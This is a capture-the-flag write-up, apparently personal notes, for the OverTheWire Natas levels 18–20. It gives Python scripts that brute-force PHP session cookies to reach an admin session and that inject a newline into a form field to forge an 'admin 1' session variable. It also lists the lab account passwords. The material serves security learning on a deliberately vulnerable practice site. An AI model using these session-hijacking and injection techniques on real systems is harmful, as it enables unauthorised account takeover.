
2024-07-20 16:35

Source: #web #py #natas 

Tags: [[PHP]]
## Natas 18 

- PHP uses one of two methods to keep track of sessions. If cookies are enabled, like in our case, it uses them.
- If cookies are disabled, it uses the URL.
here in the source we are given `maxid` as `640`

```
import requests
username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'

url = 'http://natas18.natas.labs.overthewire.org/'
session = requests.Session()

for session_id in range(1,641):
    response = session.get(url,cookies = {"PHPSESSID": str(session_id)}, auth = (username,password))

    content = response.text

    if("You are an admin" in content):
        print("Got it!",session_id)
        print(content)
        break
    else:
        print("trying", session_id)
```
### TLDR

we gotta brute force all the possible session id's ranging from 1 to 640 and one of the session id is gotta be the admin session id

## Natas19

source code is similar to natas 18 the difference is that the `phpsessid` is  encoded in hex and the username is appended to the session id before encoding the whole .
eg. `45-admin` is encoded and used as the session id 

```
import requests
username = 'natas19'
password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'

url = 'http://natas19.natas.labs.overthewire.org/'
session = requests.Session()

for i in range(641):
    print({"PHPSESSID" : str("%d-admin" % i).encode('UTF-8').hex()})

    response= session.get(url,cookies = {"PHPSESSID" : str("%d-admin" % i).encode('UTF-8').hex()},auth = (username,password))

    if("You are an admin" in response.text):
        print("got it", i)
        print(response.text)
        break
```
### TLDR

- we run a for loop ranging from 1 to 640 and we apply the loop in `<number>-admin` 
- where `<number>` is cycled through and the whole thing is encoded in hex 
- one of these encoded session id is gotta be the admin session id.
## Natas 20

- here 2 functions are defined namely read and write 
- `read` function 
	- checks if a file path exists corresponding to a session id if not then creates one 
	- it reads the contents from the file creating an array and then process the data bit by bit using the `explode` function
- `write` function 
	- works with the same file name as read, it uses simply writes the output from the server to a file 
Whole code is operating in a session thus we add more code to existing code

```
import requests
username = 'natas20'
password = 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'

url = 'http://natas20.natas.labs.overthewire.org/?debug=true'
session = requests.Session()

response= session.post(url,auth = (username,password))
print(response.text)
print("="*80)
#create a session id 

response= session.post(url,data={"name":"bmth\nadmin 1"},auth = (username,password))
print(response.text)
print("="*80)
#exploiting the explode functionality we add a new line and change admin to 1

response= session.post(url,auth = (username,password))
print(response.text)
print("="*80)
#this is just to check if we are still admin or not 
```
they're just splitting up variables line by line and with a space in between each thing we could just as easily add a new line and change whatever session variables we really wanted to

### Reference
https://www.youtube.com/watch?v=C9yxUTQLbRI

phpsessid - https://stackoverflow.com/questions/1370951/what-is-phpsessid